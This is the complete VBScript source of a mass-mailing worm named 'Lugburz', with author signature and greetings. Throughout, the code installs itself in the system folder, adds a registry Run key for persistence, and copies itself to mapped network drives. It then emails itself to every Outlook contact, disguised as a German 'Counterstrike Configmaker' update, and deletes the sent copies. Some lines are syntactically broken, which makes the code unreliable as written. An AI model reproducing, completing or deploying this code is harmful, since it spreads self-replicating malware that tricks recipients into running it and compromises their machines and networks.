' Lugburz 
' by Razorblade
' Gr33tz t0: Phereal, HumanBomb, Thanatos & all the others ;)

On Error Resume Next

Dim UU
Dim LU
Dim RA
Dim ZO
Dim VX
Dim 10
Dim RT
Dim AB
Dim 05
Dim razor

Set UU = CreateObject( "Scripting.FileSystemObject" )
UU.CopyFile WScript.ScriptFullName, UU.BuildPath(UU.GetSpecialFolder(1), "Lugburz.VBS" )

Set LU = CreateObject( "WScript.Shell" )
LU.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Lugburz", UU.BuildPath(UU.GetSpecialFolder(1), "Lugburz.VBS" )

Set RA = CreateObject( "WScript.Network" )
Set VX = RA.EnumNetworkDrives

If VX.Count <> 0 Then
For ZO = 0 To VX.Count - 1
If InStr(VX.Item(ZO), "\") <> 0 Then
UU.CopyFile WScript.ScriptFullName, UU.BuildPath(VX.Item(ZO), "Lugburz.VBS")

End If
Next
End If

ZO = LU.RegRead("HKEY_LOCAL_MACHINE\" & "Lugburz")

If ZO = "" Or ZO > 20 Then
ZO = 0
End If

If ZO = 0 Then
Set AB = CreateObject( "Outlook.Application" )
Set 10 = AB.GetNameSpace("MAPI")

For Each RT In 10.AddressLists
Set VX = AB.CreateItem(0)

For AB = 1 To RT.AddressEntries.Count
Set razor = RT.AddressEntries(AB)

If AB = 1 Then
VX.BCC = razor.Address
Else
VX.BCC = VX.BCC & "" & razor.Address
End If
Next

VX.Subject = "Re: Counterstrike Configmaker"
VX.Body = "So, hier haste jetzt endlich die neue Version des CS Config Makers! Vielleicht wirst du damit ja zum Progamer *g*"
VX.Attachmets.Add WScript.ScriptFullName
VX.DeleteAfterSubmit = True
VX.Send
Next

ZO = 0
End If

LU.RegWrite "HKEY_LOCAL_MACHINE\" & "Lugburz", ZO + 1

msgbox "METAL 4 EVER","16","LuGBuRZ"